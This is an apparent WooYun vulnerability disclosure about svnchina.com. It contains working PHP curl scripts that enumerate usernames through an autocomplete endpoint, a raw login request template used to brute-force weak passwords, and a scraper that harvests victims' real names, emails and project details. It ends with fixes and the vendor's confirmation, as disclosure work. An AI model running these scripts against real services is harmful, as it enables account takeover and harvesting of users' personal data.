{"id": 28769, "wybug_id": "wooyun-2015-0110912", "wybug_title": "svnchina中国源代码托管平台设计缺陷导致密码门事件", "wybug_corp": "svnchina.com", "wybug_author": "冰海", "wybug_date": "2015-04-29 10:08", "wybug_open_date": "2015-06-17 16:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "设计不当", "程序员", "中国源代码托管平台", "登录未做限制", "密码门"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向公众公开  简要描述： 处处留心皆学问…… 详细说明：  0x00 发现漏洞在使用svnchina的某个功能时，发现了某处用户体验特别好的地方，如下：\n\n这是在创建新项目邀请开发人员的地方提供的一个功能，输入3个字符后即会返回所有包含这三个字符的所有svnchina的用户，在普通人眼里没觉得什么，可能还会觉得体验很不错，但是在白帽子的眼里可不这样认为，很大的安全隐患，本人首先想到的是可以利用这一点跑网站的用户。抓包得到接口地址为：\nhttp://www.svnchina.com/project_ac.php?term=\nGET请求，传递参数为\"zha\"即可返回包含字符串\"zha\"的所有用户，如下(返回结果颇多)：\n\n0x01 挖掘用户1.生成字典：首先需要生成参数字典，期初的想法是用aaa,aab,aac,aad,aae，.....的字典去抓取用户，字典生成后又被自己否定，字典太大，请求次数太多，数据重复量会比较大，用户质量也不高。故想到一妙计，用百家姓姓氏去抓取网站的用户，可行之处是svnchina一般为团队协作开发，故账号一般为用户真实姓名，如zhangsan,lisi,wangwu这种的，这样的用户账号质量比较高。在生成百家姓字典时着实费了一番功夫，网上没有现成的，基本上都是中文+拼音音标，在此写第一个php脚本处理百家姓字典，把音标都去掉，只留拼音，如zhang,wang,li,zhao等，每行一个，共生成400多个百家姓字典。2.执行php脚本抓取svn用户，核心代码示例：\n//调用接口查用户function getUser($name){    $name = urlencode($name);    $ch = curl_init();    $data = array (        'term'=>$name    );    $header[] = \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\";//定义content-type为xml    $cookie_file = dirname(__FILE__) . '/cookie.txt';    $url = 'http://www.svnchina.com/project_ac.php?term='.$name;    echo $url.'\\n';    curl_setopt($ch, CURLOPT_URL, $url);    //curl_setopt($ch, CURLOPT_HTTPHEADER, $header);//设置HTTP头    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);//设置HTTP头    curl_setopt($ch, CURLOPT_POST, 1);    //curl_setopt($ch,CURLOPT_REFERER,'http://www.tuling123.com/openapi/cloud/proexp.jsp');    curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);    //curl_setopt($ch, CURLOPT_POSTFIELDS, $data);    $return = curl_exec($ch);    curl_close($ch);    //var_dump(curl_error($ch)); //打印curl出错信息    //echo $return;exit;    return $return;}\n返回结果经过处理后写入文本，每行一个。程序执行结束后返回结果为13多万条，去重后获得3万多个真实用户，去重用工具或脚本都可以。0x02 猜解用户密码\n\nsvnchina用户登录表单没有加验证码，并且没有输入密码错误次数限制，导致可以无限跑字典破解用户密码，这里使用弱口令进行破解，用工具抓包：\nGET /login.php?password=§1§&username=§zhangyu§ HTTP/1.1Host: www.svnchina.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: application/json, text/javascript, */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.svnchina.com/Cookie: PHPSESSID=7g9cbeugagfo28ecua9sbs8bk4Connection: keep-alive\n1.用用户名和密码一样的字典组合进行跑包，如zhangsan:zhangsan，返回结果为true即为密码正确，利用这种组合获得用户账号密码2375条记录。\n\n2.用弱口令123456和用户名组合进行跑包，如zhangsan:123456，首先对上面用户列表去重，然后进行跑包，减少请求次数，也节省时间，密码为123456的返回结果有1379条，其它的弱口令数量比较少，不计在内，在3万多用户中用如此之多的用户使用了这么简单的密码，也真实佩服这些用户的安全意识了，跑出这么多用户后心哇凉哇凉的，有点同情这些哥们……   漏洞证明：  0x03 漏洞利用升级ps:猜解这些用户的账号密码还有下面所提到的攻击手法只是为了演示弱口令的危害性，用数据说话，请不要歪解……拿到用户的账号密码后可以登录svnchina获取用户更为真实的信息，如真实姓名、邮箱、创建项目、加入项目、项目名称、项目成员、项目路径等等一些列信息，这些用php模拟用户登录都可以抓取到，附部分抓取脚本，正则太烂了，稀里糊涂写出来的，功能都可以实现：\n$url='http://www.svnchina.com/project.php';    $ch = curl_init($url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($ch, CURLOPT_COOKIEFILE,$cookie);    set_time_limit(0); // 最大执行时间这里设置300秒    $contents = curl_exec($ch);    //echo $contents;exit;    preg_match_all(\"%用户名 : <label>(.*?)</label></p>%si\", $contents, $usernames);//用户名    preg_match_all(\"%用户组 : <label>(.*?)<label>\t\t\t\t\t\t\t\t\t</p>%si\", $contents, $group);//用户组    preg_match_all(\"%真实姓名 :<label>(.*?)<label></p>\t\t\t\t<p>%si\", $contents, $realName);//真实姓名    preg_match_all(\"%Email : <label>(.*?)<label></p>\t\t\t\t<p>%si\", $contents, $email);//Email    preg_match_all(\"%<div class=\\\"portlet-header\\\">我创建的项目：共(.*?)个</div>\t\t<div class=\\\"portlet-content\\\">%si\", $contents, $projectCreateCount);//创建的项目数    preg_match_all(\"%<div class=\\\"portlet-header\\\">我加入的项目：共(.*?)个</div>\t\t<div class=\\\"portlet-content\\\">%si\", $contents, $projectShareCount);//加入的项目数    preg_match_all(\"%title=\\\"\t\t\t\t\t\t\t SVN地址：(.*?)<br>\t\t\t\t\t\t\t 项目成员%si\", $contents, $projectUrl);//SVN地址    //echo($projectUrl[1][0]);echo($projectUrl[1][1]);exit;    preg_match_all(\"%项目成员：(.*?)<p>\\S*</p>\\\">%si\", $contents, $projectPeople);//项目成员    //echo($projectPeople[1][0]);echo($projectPeople[1][1]);exit;    preg_match_all(\"%</p>\\\">(.*?)</a>\t\t\t\t\t\t</td>\t\t\t\t\t\t<td>%si\", $contents, $projectName);//项目名    preg_match_all(\"%</a>\t\t\t\t\t\t</td>\t\t\t\t\t\t<td>(.*?)</td>\t\t\t\t\t\t<td>%si\", $contents, $projectCreator);//项目创建人    preg_match_all(\"%</p>\\\">(.*?)</td>\t\t\t\t\t</tr>\t\t\t\t\t\t\t\t\t\t<tr>%si\", $contents, $projectInfo);//项目信息\n附部分抓取结果：\n\n0x04 尾声上述事件最大的责任在于网站开发者，其二在于用户的安全意识。网站开发者站在用户的角度考虑是正确的，看似给用户提供了一个体验比较好的功能，但是在白帽子或者黑客的眼里这都是特别危险的。   修复方案：  1.去掉可以获取用户账号的接口，邀请开发成员加入项目时不需要要提供此功能，一般开发为个人或一个团队，大家都相互认识，问个用户名也不是什么复杂的事；2.网站登录处加验证码限制，同时加密码输入错误次数限制，防止猜解用户密码的行为。   版权声明：转载请注明来源 冰海@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-03 15:58 厂商回复： 谢谢您对本次漏洞的指出.我们已经第一时间尽快修复该问题. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-17 17:00 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  这位白帽子的包装能力不错     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}